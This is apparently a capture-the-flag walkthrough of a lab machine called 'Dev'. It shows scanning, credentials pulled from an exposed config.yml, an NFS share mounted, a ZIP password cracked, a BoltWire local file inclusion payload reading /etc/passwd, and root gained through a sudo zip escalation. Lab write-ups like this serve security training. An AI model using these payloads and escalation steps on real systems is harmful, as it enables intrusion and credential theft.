# Dev

## Enumeration <a href="#ennumeration" id="ennumeration"></a>

```
sudo netdiscover -r 10.0.2.0/24

 10.0.2.8        08:00:27:2d:08:71      2     120  PCS Systemtechnik GmbH               
```

* nmap

```
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:96:ec:08:2f:b1:ea:06:ca:fc:46:8a:7e:8a:e3:55 (RSA)
|   256 56:32:3b:9f:48:2d:e0:7e:1b:df:20:f8:03:60:56:5e (ECDSA)
|_  256 95:dd:20:ee:6f:01:b6:e1:43:2e:3c:f4:38:03:5b:36 (ED25519)
80/tcp    open  http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Bolt - Installation error
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      33059/udp   mountd
|   100005  1,2,3      45785/udp6  mountd
|   100005  1,2,3      49501/tcp   mountd
|   100005  1,2,3      51005/tcp6  mountd
|   100021  1,3,4      34697/tcp   nlockmgr
|   100021  1,3,4      35729/tcp6  nlockmgr
|   100021  1,3,4      51810/udp6  nlockmgr
|   100021  1,3,4      56408/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
8080/tcp  open  http     Apache httpd 2.4.38 ((Debian))
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()
34697/tcp open  nlockmgr 1-4 (RPC #100021)
35899/tcp open  mountd   1-3 (RPC #100005)
49501/tcp open  mountd   1-3 (RPC #100005)
54403/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.29 seconds
```

## Apache <a href="#apache" id="apache"></a>

* FFUF

```
 :: Method           : GET
 :: URL              : http://10.0.2.8/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

#                       [Status: 200, Size: 3833, Words: 926, Lines: 108]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 3833, Words: 926, Lines: 108]
#                       [Status: 200, Size: 3833, Words: 926, Lines: 108]
# directory-list-2.3-medium.txt [Status: 200, Size: 3833, Words: 926, Lines: 108]
                        [Status: 200, Size: 3833, Words: 926, Lines: 108]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 3833, Words: 926, Lines: 108]
# This work is licensed under the Creative Commons  [Status: 200, Size: 3833, Words: 926, Lines: 108]
#                       [Status: 200, Size: 3833, Words: 926, Lines: 108]
public                  [Status: 301, Size: 305, Words: 20, Lines: 10]
src                     [Status: 301, Size: 302, Words: 20, Lines: 10]
app                     [Status: 301, Size: 302, Words: 20, Lines: 10]
vendor                  [Status: 301, Size: 305, Words: 20, Lines: 10]
extensions              [Status: 301, Size: 309, Words: 20, Lines: 10]
#                       [Status: 200, Size: 3833, Words: 926, Lines: 108]
# on atleast 2 different hosts [Status: 200, Size: 3833, Words: 926, Lines: 108]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 3833, Words: 926, Lines: 108]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 3833, Words: 926, Lines: 108]
# Copyright 2007 James Fisher [Status: 200, Size: 3833, Words: 926, Lines: 108]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 3833, Words: 926, Lines: 108]
                        [Status: 200, Size: 3833, Words: 926, Lines: 108]
server-status           [Status: 403, Size: 273, Words: 20, Lines: 10]
:: Progress: [220560/220560] :: Job [1/1] :: 27276 req/sec :: Duration: [0:00:16] :: Errors: 0 ::
```

* browse through interesting folders and apps discovered

```
curl 10.0.2.8/app/config/config.yml |grep -A 2 username:                                                                                             2 ⨯
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 21075  100 21075    0     0  20.3M      username: bolt
    0 -    password: I_love_java


 username: bolt
 password: I_love_java
```

## NFS <a href="#nfs" id="nfs"></a>

```
showmount -e 10.0.2.8
Export list for 10.0.2.8:
/srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16
```

* Mount

```
sudo mkdir /mnt/dev
sudo mount -t nfs 10.0.2.8:/srv/nfs /mnt/dev
```

* Unzip file found

```
unzip save.zip

Archive:  save.zip
[save.zip] id_rsa password: 
password incorrect--reenter: 
password incorrect--reenter: 
   skipping: id_rsa                  incorrect password
   skipping: todo.txt                incorrect password
```

* Try cracking ZIP password

```
sudo apt install -y fcrackzip

fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip

fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip 
found file 'id_rsa', (size cp/uc   1435/  1876, flags 9, chk 2a0d)
found file 'todo.txt', (size cp/uc    138/   164, flags 9, chk 2aa1)


PASSWORD FOUND!!!!: pw == java101
                                
```

* Unzip again with the password java101

```
sudo unzip save.zip

Archive:  save.zip
[save.zip] id_rsa password: 
  inflating: id_rsa                  
  inflating: todo.txt                
```

## BOLTWIRE <a href="#boltwire" id="boltwire"></a>

[https://www.exploit-db.com/exploits/48411](https://www.exploit-db.com/exploits/48411)

```
 searchsploit boltwire
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
BoltWire 3.4.16 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities                                                | php/webapps/36552.txt
BoltWire 6.03 - Local File Inclusion                                                                                       | php/webapps/48411.txt
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------


1) Using HTTP GET request browse to the following page, whilst being authenticated user.
http://192.168.51.169/boltwire/index.php?p=action.search&action=../../../../../../../etc/passwd
```

[URL](http://10.0.2.8:8080/dev/index.php?p=action.search\&action=../../../../../../../etc/passwd)

Need to [register with a normal user first](http://10.0.2.8:8080/dev/index.php?p=action.register)

![](<../.gitbook/assets/image (3) (1).png>)

This find with the id\_rsa found before can be an indication

```
jeanpaul:x:1000:1000:jeanpaul,,,:/home/jeanpaul:/bin/bash
```

## SSH <a href="#ssh" id="ssh"></a>

```
ssh -i id_rsa jeanpaul@10.0.2.8                         
Enter passphrase for key 'id_rsa': 

password can be inside the config.yml found earlier

password: I_love_java

DONE

run history to find interesting things
```

* Since we have sudo without password we can look for sudo escalation using the ZIP command

[Using GTFOBin](https://gtfobins.github.io/gtfobins/zip/)

```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF

# whoami
root

# cat /root/flag.txt
Congratz on rooting this box !
```

\
